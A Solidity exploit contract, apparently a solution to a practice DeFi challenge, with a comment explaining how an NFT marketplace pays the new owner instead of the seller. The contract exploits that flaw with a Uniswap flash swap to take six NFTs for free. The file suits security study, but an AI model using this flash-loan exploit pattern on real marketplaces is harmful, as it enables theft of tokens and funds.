// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/token/ERC721/IERC721.sol';

interface IFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external
    returns (bytes4);
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}

interface IFreeRiderBuyer {
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        returns (bytes4);
}

/// @title AttackerFreeRider
/// @author kaliberpoziomka
/// @notice Exploits NFT marketplace vulnerability to steal NFTs
/**
@dev
Exploit:
FreeRiderNFTMarketplace has a severe bug in _buyOne function.
During safeTransferFrom function, owner of NFT token is changed.
Next action is transfering ETH for bought NFT to the owner of NFT. 
But at this time, owner is changed (the person who bought it), so in fact user buys NFT and get ETH back.
=====
// transfer from seller to buyer
    token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

// pay seller
payable(token.ownerOf(tokenId)).sendValue(priceToPay);
====

We can exploit this vulnerability using flash swap at Uniswap

 */
contract AttackerFreeRider is IUniswapV2Callee, IERC721Receiver{
    IFreeRiderNFTMarketplace market;
    IFreeRiderBuyer buyer;
    IWETH9 weth;
    IUniswapV2Pair uniswap;
    IERC721 nft;
    uint256[] nft_ids = [0,1,2,3,4,5];


    constructor(address _market, address _buyer, address _weth, address _uniswap, address _nft) {
        market = IFreeRiderNFTMarketplace(_market);
        buyer = IFreeRiderBuyer(_buyer);
        weth = IWETH9(_weth);
        uniswap = IUniswapV2Pair(_uniswap);
        nft = IERC721(_nft);
    }
    
    // This function is a must to receive ERC721 NFTs
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override
    returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    // Function that flash swap is calling.
    // Here we exploit fact, that when buying nft we get ETH back
    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external override {
        // exchange wrappedETH to ETH (to buy nfts)
        weth.withdraw(amount0);

        // Buy all nfts from marketplace using initial 15 eth
        market.buyMany{value: address(this).balance}(nft_ids);

        // exchange 15 ETH back to WETH
        weth.deposit{value: address(this).balance}();

        // pay back flash loan
        weth.transfer(address(uniswap), weth.balanceOf(address(this)));

        // tranfser nfts to the buyer
        for(uint256 i = 0; i < nft_ids.length; i++){
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
    }

    // Attack by using Uniswap's Flash Swap (like a flash loan, but you swap not lend)
    // We flash lend 15 ETH (each NFT price)
    function attack(uint amount) external payable {
        uniswap.swap(amount, 0, address(this), new bytes(1));
    }

    receive() external payable {}
}